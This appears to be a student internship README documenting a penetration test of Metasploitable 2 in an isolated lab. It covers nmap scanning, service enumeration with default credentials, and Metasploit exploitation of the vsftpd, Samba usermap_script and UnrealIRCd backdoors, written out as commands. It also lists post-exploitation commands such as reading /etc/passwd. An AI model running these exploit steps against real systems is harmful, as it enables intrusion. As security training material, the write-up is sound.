# 🔐 Vulnerability Assessment and Penetration Testing (VAPT)
### Virtual Lab Environment — Internship Project

<p align="center">
  <img src="https://img.shields.io/badge/Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white"/>
  <img src="https://img.shields.io/badge/Metasploit-2596CD?style=for-the-badge&logo=metasploit&logoColor=white"/>
  <img src="https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white"/>
  <img src="https://img.shields.io/badge/Nmap-214478?style=for-the-badge&logo=nmap&logoColor=white"/>
  <img src="https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge"/>
</p>

---

## ⚠️ Disclaimer

> **This project was conducted entirely in an isolated virtual lab environment for educational purposes only.**
> All target systems (Metasploitable 2) are intentionally vulnerable machines designed for security training.
> No real-world systems were targeted. All testing was performed on a private VMware Host-only network
> with no internet connectivity. This project demonstrates ethical hacking skills for cybersecurity education.

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Lab Architecture](#-lab-architecture)
- [Tools & Technologies](#-tools--technologies)
- [Project Structure](#-project-structure)
- [Phase Walkthrough](#-phase-walkthrough)
  - [Phase 1 — Lab Setup](#phase-1--lab-setup)
  - [Phase 2 — Reconnaissance](#phase-2--reconnaissance)
  - [Phase 3 — Port Scanning](#phase-3--port-scanning)
  - [Phase 4 — Service Enumeration](#phase-4--service-enumeration)
  - [Phase 5 — Vulnerability Assessment](#phase-5--vulnerability-assessment)
  - [Phase 6 — Exploitation](#phase-6--exploitation)
  - [Phase 7 — Traffic Analysis](#phase-7--traffic-analysis)
  - [Phase 8 — Reporting](#phase-8--reporting)
- [Key Findings](#-key-findings)
- [CVE Summary](#-cve-summary)
- [Exploitation Results](#-exploitation-results)
- [Skills Demonstrated](#-skills-demonstrated)
- [Project Reports](#-project-reports)

---

## 📌 Project Overview

This project is a complete **Vulnerability Assessment and Penetration Testing (VAPT)** engagement
performed in a controlled virtual lab environment as part of a cybersecurity internship.

The project follows a professional 8-phase penetration testing methodology from initial lab setup
through to documented exploitation, network traffic analysis, and a full professional security report.

| Property | Details |
|---|---|
| **Project Type** | Vulnerability Assessment & Penetration Testing |
| **Environment** | VMware Workstation — Host-only isolated network |
| **Primary Target** | Metasploitable 2 — `192.168.128.166` |
| **Secondary Target** | Windows 11 Home — `192.168.128.162` |
| **Attacker Platform** | Kali Linux — `192.168.128.164` |
| **Assessment Period** | May 21–24, 2026 |
| **Framework** | Metasploit v6.4.116-dev |
| **Total Vulnerabilities** | 13 (6 Critical, 5 High, 2 Medium) |
| **Successful Exploits** | 3 (all resulting in root access) |

---

## 🏗️ Lab Architecture

```
┌─────────────────────────────────────────────────────┐
│           VMware Host-only Network                   │
│              192.168.128.0/24                        │
│                                                      │
│  ┌──────────────────┐                                │
│  │   Kali Linux     │  192.168.128.164               │
│  │  (Attacker)      │                                │
│  └────────┬─────────┘                                │
│           │                                          │
│    ┌──────┴───────┐                                  │
│    │              │                                  │
│    ▼              ▼                                  │
│  ┌──────────┐  ┌──────────────┐                      │
│  │Metasploit│  │  Windows 11  │                      │
│  │  able 2  │  │    Home      │                      │
│  │.128.166  │  │  .128.162    │                      │
│  └──────────┘  └──────────────┘                      │
└─────────────────────────────────────────────────────┘
```

All three virtual machines communicate on an isolated Host-only VMware network.
**No traffic leaves this network** — completely safe, air-gapped lab environment.

---

## 🛠️ Tools & Technologies

| Category | Tool | Version | Purpose |
|---|---|---|---|
| Attacker OS | Kali Linux | 2024.x | Primary attack platform |
| Exploitation | Metasploit Framework | v6.4.116-dev | Vulnerability exploitation |
| Scanning | Nmap | 7.98 | Port scanning & service detection |
| Traffic Analysis | Wireshark | Latest | Packet capture & analysis |
| Web Scanning | Nikto | v2.6.0 | Web vulnerability scanning |
| SMB Enumeration | enum4linux | v0.9.1 | SMB/Samba enumeration |
| Virtualization | VMware Workstation | Pro | Lab environment hosting |

---

## 📁 Project Structure

```
VAPT_Project/
│
├── 📸 Screenshots/
│     ├── host_discovery_scan.png          # Phase 2 — Nmap ping sweep
│     ├── metasploitable_deep_scan.png     # Phase 3 — Full port scan
│     ├── metasploitable_OS_scan.png       # Phase 3 — OS detection scan
│     ├── metasploitable_service_scan.png  # Phase 3 — Service version scan
│     ├── ftp_anonymous_login.png          # Phase 4 — FTP enumeration
│     ├── telnet_login.png                 # Phase 4 — Telnet default creds
│     ├── enum4linux_smb.png               # Phase 4 — SMB enumeration
│     ├── nikto_http_scan.png              # Phase 4 — Web vulnerability scan
│     ├── mysql_info_scan.png              # Phase 4 — MySQL enumeration
│     ├── msfconsole_launch.png            # Phase 5 — Metasploit launch
│     ├── vsftpd_search.png               # Phase 5 — Module verification
│     ├── vsftpd_exploit_root.png         # Phase 6 — Exploit 1 root shell
│     ├── whoami_hostname.png             # Phase 6 — Post-exploitation
│     ├── id_uid0.png                     # Phase 6 — uid=0(root) proof
│     ├── uname_kernel.png               # Phase 6 — Kernel version
│     ├── etc_passwd.png                 # Phase 6 — User database
│     ├── ifconfig_netstat.png           # Phase 6 — Network & connections
│     ├── var_www_contents.png           # Phase 6 — Web root enumeration
│     ├── samba_exploit.png              # Phase 6 — Exploit 2 Samba
│     ├── unrealircd_exploit.png         # Phase 6 — Exploit 3 UnrealIRCd
│     ├── wireshark_syn_scan.png         # Phase 7 — SYN scan capture
│     ├── wireshark_ip_filter.png        # Phase 7 — IP filter view
│     ├── wireshark_ftp_stream.png       # Phase 7 — FTP plain text
│     └── wireshark_ftp_packets.png      # Phase 7 — FTP packet list
│
├── 📄 Scan_Results/
│     ├── host_discovery.txt
│     ├── metasploitable_service_scan.txt
│     └── metasploitable_service_OS_scan.txt
│
├── 💻 Commands/
│     └── nmap_commands.txt
│
├── 📝 Notes/
│     ├── observations.txt
│     └── network_info.txt
│
├── 🔬 Enumeration/
│     └── (enumeration output files)
│
├── 💥 Exploitation/
│     └── (exploitation notes)
│
├── 📦 Capture/
│     └── meta.pcapng                    # Wireshark packet capture
│
└── 📋 Reports/
      ├── VAPT_Report_Phase1_Phase2.docx
      ├── VAPT_Report_Phase3_PortScanning.docx
      ├── VAPT_Report_Phase4_Enumeration.docx
      ├── VAPT_Report_Phase5_Phase6.docx
      ├── VAPT_Report_Phase7_TrafficAnalysis.docx
      └── VAPT_Final_Report.docx          ← Complete professional report
```

---

## 🔄 Phase Walkthrough

### Phase 1 — Lab Setup

Configured an isolated VMware virtual lab with 3 virtual machines on a Host-only network (`192.168.128.0/24`).

```bash
# Verify connectivity between all VMs
ping -c 4 192.168.128.166   # Kali → Metasploitable 2
ping -c 4 192.168.128.162   # Kali → Windows 11
```

**Deliverables:** VM screenshots, ping verification, IP table, architecture diagram

---

### Phase 2 — Reconnaissance

Discovered all live hosts on the lab subnet using ping sweep and ARP scanning.

```bash
# Ping sweep — discover all live hosts
nmap -sn 192.168.128.0/24

# ARP-based host discovery
netdiscover -r 192.168.128.0/24
```

**Result:** 3 hosts discovered — `192.168.128.164`, `192.168.128.162`, `192.168.128.166`

---

### Phase 3 — Port Scanning

Identified 26 open ports on Metasploitable 2 across three Nmap scan techniques.

```bash
# Quick SYN stealth scan
nmap -sS 192.168.128.166

# Full port scan with service version detection
nmap -sS -sV -p- 192.168.128.166 -oN metasploitable_service_scan.txt

# Aggressive scan with OS detection
nmap -A -T4 192.168.128.166 -oN metasploitable_OS_scan.txt
```

**Result:** 26 open ports including FTP(21), SSH(22), Telnet(23), HTTP(80), SMB(139/445), MySQL(3306), IRC(6667), Tomcat(8180)

---

### Phase 4 — Service Enumeration

Performed deep enumeration of 5 major services to extract credentials, usernames, and configuration details.

```bash
# FTP — anonymous login test
ftp 192.168.128.166
# Result: 230 Login successful (anonymous / blank password)

# Telnet — default credential test
telnet 192.168.128.166
# Result: Login successful with msfadmin/msfadmin

# SMB — NULL session enumeration
enum4linux -a 192.168.128.166
# Result: 7 usernames dumped, NULL session confirmed

# HTTP — web vulnerability scan
nikto -h 192.168.128.166
# Result: 14 findings including phpMyAdmin, phpinfo.php, outdated PHP/Apache

# MySQL — version and capability probe
nmap --script mysql-info 192.168.128.166 -p 3306
# Result: MySQL 5.0.51a exposed, auth salt leaked
```

**Usernames Harvested via SMB:** `administrator, guest, krbtgt, domain admins, root, bin, none`

---

### Phase 5 — Vulnerability Assessment

Mapped all findings to CVEs using Metasploit module search and verified exploitability.

```bash
# Launch Metasploit Framework
msfconsole

# Search for vsftpd exploit
msf > search vsftpd
# Result: exploit/unix/ftp/vsftpd_234_backdoor — Rank: EXCELLENT

# Search for UnrealIRCd exploit
msf > search UnrealIRCd
# Result: exploit/unix/irc/unreal_ircd_3281_backdoor — Rank: EXCELLENT
```

**13 vulnerabilities identified — 6 Critical, 5 High, 2 Medium**

---

### Phase 6 — Exploitation

Successfully exploited 3 critical vulnerabilities, achieving root access via each.

#### Exploit 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)
```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit > set RHOSTS 192.168.128.166
msf exploit > set LHOST 192.168.128.164
msf exploit > exploit

# Result:
# [+] 192.168.128.166:21 - Backdoor has been spawned!
# [*] Meterpreter session 1 opened
# meterpreter > shell
# whoami → root
# id     → uid=0(root) gid=0(root)
```

#### Exploit 2 — Samba usermap_script (CVE-2007-2447)
```bash
msf > use exploit/multi/samba/usermap_script
msf exploit > set RHOSTS 192.168.128.166
msf exploit > set LHOST 192.168.128.164
msf exploit > exploit

# Result:
# [*] Command shell session 1 opened
# ls → bin boot cdrom dev etc home ... (root filesystem)
```

#### Exploit 3 — UnrealIRCd Backdoor (CVE-2010-2075)
```bash
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit > set RHOSTS 192.168.128.166
msf exploit > set LHOST 192.168.128.164
msf exploit > exploit

# Result:
# [*] Meterpreter session 1 opened
# (192.168.128.164:4444 → 192.168.128.166:44009)
```

#### Post-Exploitation Commands (inside root shell)
```bash
whoami          # root
hostname        # metasploitable
id              # uid=0(root) gid=0(root)
uname -a        # Linux metasploitable 2.6.24-16-server 2008 i686
cat /etc/passwd # Full user database
ifconfig        # Network interfaces
ls /root        # Desktop reset_logs.sh vnc.log
ls /var/www     # dvwa mutillidae phpMyAdmin tikiwiki twiki
netstat -ant    # All active connections
```

---

### Phase 7 — Traffic Analysis

Captured 2,493 packets using Wireshark on eth0 during active scanning and exploitation.

```
Filter 1: tcp.flags.syn == 1 && tcp.flags.ack == 0
→ 1,003 SYN packets (42.4%) — Nmap scan signature visible
→ Window=1024 confirms Nmap fingerprint

Filter 2: ip.addr == 192.168.128.166
→ 2,043 packets (85.9%) — full bidirectional attack traffic
→ RST,ACK = closed ports | SYN,ACK = open ports

Filter 3: tcp.stream eq 1003
→ Complete FTP session reconstructed
→ USER anonymous / PASS anonymous visible in plain text ASCII
→ Proves FTP has zero confidentiality
```

**Capture file:** `meta.pcapng` (2,493 packets)

---

### Phase 8 — Reporting

Professional documentation produced for all 8 phases with:
- CVE references and CVSS scores
- Color-coded risk severity tables
- Actual terminal output reproduced
- Screenshot references by filename
- Remediation recommendations with exact commands

---

## 🎯 Key Findings

| # | Finding | Risk | Impact |
|---|---|---|---|
| 1 | vsftpd 2.3.4 backdoor (CVE-2011-2523) | 🔴 Critical | Remote root shell |
| 2 | UnrealIRCd backdoor (CVE-2010-2075) | 🔴 Critical | Remote root shell |
| 3 | Samba RCE (CVE-2007-2447) | 🔴 Critical | Remote root shell |
| 4 | Anonymous FTP login enabled | 🔴 Critical | Unauthenticated file access |
| 5 | Telnet default credentials | 🔴 Critical | Full shell access |
| 6 | Root bindshell on port 1524 | 🔴 Critical | Instant root access |
| 7 | SMB NULL session | 🟠 High | Username enumeration |
| 8 | phpinfo.php exposed | 🟠 High | Server config disclosure |
| 9 | phpMyAdmin exposed | 🟠 High | Database compromise |
| 10 | PHP 5.2.4 + Apache 2.2.8 EOL | 🟠 High | Multiple CVEs |
| 11 | Telnet unencrypted protocol | 🟠 High | Credential interception |
| 12 | phpMyAdmin changelog leak | 🟡 Medium | Information disclosure |
| 13 | Directory indexing enabled | 🟡 Medium | File enumeration |

---

## 🗂️ CVE Summary

| CVE | Service | CVSS | Description |
|---|---|---|---|
| CVE-2011-2523 | vsftpd 2.3.4 / Port 21 | 10.0 | Backdoor opens root shell on port 6200 |
| CVE-2010-2075 | UnrealIRCd 3.2.8.1 / Port 6667 | 10.0 | IRC daemon executes arbitrary commands |
| CVE-2007-2447 | Samba 3.0.20 / Port 139 | 10.0 | Username map script command injection RCE |
| CVE-2003-1418 | phpMyAdmin / Port 80 | 5.0 | ChangeLog information disclosure |
| CVE-1999-0678 | Apache 2.2.8 / Port 80 | 5.0 | Directory listing / information disclosure |

---

## 💥 Exploitation Results

```
╔══════════════════════════════════════════════════════════════╗
║              EXPLOITATION SUMMARY                            ║
╠══════════════════════════════════════════════════════════════╣
║  Exploit 1: exploit/unix/ftp/vsftpd_234_backdoor             ║
║  CVE: CVE-2011-2523  |  Rank: EXCELLENT                      ║
║  Session: Meterpreter session 1                              ║
║  Result: whoami = ROOT ✓                                     ║
╠══════════════════════════════════════════════════════════════╣
║  Exploit 2: exploit/multi/samba/usermap_script               ║
║  CVE: CVE-2007-2447  |  Type: Command Shell                  ║
║  Session: Command shell session 1                            ║
║  Result: Full filesystem access as ROOT ✓                    ║
╠══════════════════════════════════════════════════════════════╣
║  Exploit 3: exploit/unix/irc/unreal_ircd_3281_backdoor       ║
║  CVE: CVE-2010-2075  |  Rank: EXCELLENT                      ║
║  Session: Meterpreter session 1                              ║
║  Result: Meterpreter session opened ✓                        ║
╚══════════════════════════════════════════════════════════════╝
```

---

## 💡 Skills Demonstrated

- ✅ Virtual lab setup and network configuration (VMware)
- ✅ Linux command-line proficiency (Kali Linux)
- ✅ Network reconnaissance and host discovery (Nmap, Netdiscover)
- ✅ Port scanning and service fingerprinting (Nmap -sS, -sV, -A)
- ✅ Service enumeration (enum4linux, Nikto, FTP, Telnet, MySQL)
- ✅ Vulnerability identification and CVE mapping
- ✅ Penetration testing using Metasploit Framework
- ✅ Post-exploitation techniques and evidence gathering
- ✅ Network traffic analysis and packet inspection (Wireshark)
- ✅ Professional security report writing

---

## 📋 Project Reports

| Report | Contents |
|---|---|
| `VAPT_Report_Phase1_Phase2.docx` | Lab setup, reconnaissance, IP table |
| `VAPT_Report_Phase3_PortScanning.docx` | 26 open ports, service versions, OS detection |
| `VAPT_Report_Phase4_Enumeration.docx` | FTP, Telnet, SMB, HTTP, MySQL enumeration |
| `VAPT_Report_Phase5_Phase6.docx` | 13 CVEs + 3 successful exploits with root proof |
| `VAPT_Report_Phase7_TrafficAnalysis.docx` | Wireshark packet analysis, FTP plain-text capture |
| `VAPT_Final_Report.docx` | **Complete professional report — all phases** |

---

## 👤 Author

**[Your Full Name]**
[Your College / University]
Cybersecurity Internship Project — 2026

---

<p align="center">
  <i>This project was completed entirely in an isolated lab environment for educational purposes.</i><br>
  <i>All exploitation was performed on intentionally vulnerable systems with no real-world impact.</i>
</p>
